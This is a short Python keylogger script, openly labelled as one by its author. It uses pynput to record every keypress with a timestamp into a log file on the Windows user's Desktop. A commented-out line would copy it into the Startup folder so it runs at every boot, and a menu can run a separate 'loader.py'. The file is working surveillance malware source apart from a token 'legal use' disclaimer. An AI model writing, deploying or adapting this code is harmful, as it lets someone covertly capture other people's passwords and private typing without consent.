from pynput.keyboard import Listener
import os
import logging
from shutil import copyfile

clear = lambda: os.system('cls')
clear()

start_program = input("Created by SynT8735\nThis is a Keylogger\nIt should only be used in safe/legal enviromnents\nDo you wish to start the program?\n[y/n]\n")

q1 = 0
q2 = 0

while q1 == 0:
    if start_program == "y":
        clear()
        break
    elif start_program == "n":
        clear()
        q2 += 1
        return_to_loader = input("Do you wish to return to the main loader?\n[y/n]\n")
        break
    else:
        clear()
        print("This is not a valid input, please try again")
        start_program = input("Created by SynT8735\nThis is a Keylogger\nIt should only be used in safe/legal enviromnents\nDo you wish to start the program?\n[y/n]\n")

while q2 == 1:
    if return_to_loader == "y":
        clear()
        exec(open("loader.py").read())
        break
    elif return_to_loader == "n":
        clear()
        print("Exiting..")
        exit()
    else:
        clear()
        print("This is not a valid input, please try again")
        return_to_loader = input("Do you wish to return to the main loader?\n[y/n]\n")

username = os.getlogin()

#copyfile('main.py', f'C:/Users/{username}/Appdata/Roaming/Microsoft/Start Menu/Startup/main.py')  ---> Everytime you boot up the system it will automatically launch

logging_directory = f"C:/Users/{username}/Desktop"

logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()